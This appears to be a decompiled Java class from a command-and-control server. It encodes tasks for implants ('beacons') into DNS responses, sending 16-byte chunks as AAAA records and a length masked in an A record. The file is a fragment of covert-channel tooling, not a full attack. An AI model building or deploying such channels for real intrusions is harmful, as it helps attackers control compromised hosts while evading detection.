package beacon.dns;

import common.ByteIterator;
import common.CommonUtils;
import dns.DNSServer;

public class SendConversationAAAA extends SendConversation {
   protected ByteIterator readme = null;

   public SendConversationAAAA(String var1, String var2, long var3) {
      super(var1, var2, var3);
   }

   public boolean started() {
      return this.readme != null;
   }

   public DNSServer.Response start(byte[] var1) {
      this.readme = new ByteIterator(var1);
      return DNSServer.A((long)var1.length ^ this.idlemask);
   }

   public DNSServer.Response next() {
      byte[] var1 = this.readme.next(16L);
      if (var1.length != 16) {
         CommonUtils.print_warn("AAAA channel: task chunk is not 16 bytes.");
      }

      return DNSServer.AAAA(var1);
   }

   public boolean isComplete() {
      if (this.readme == null) {
         return true;
      } else {
         return !this.readme.hasNext();
      }
   }
}
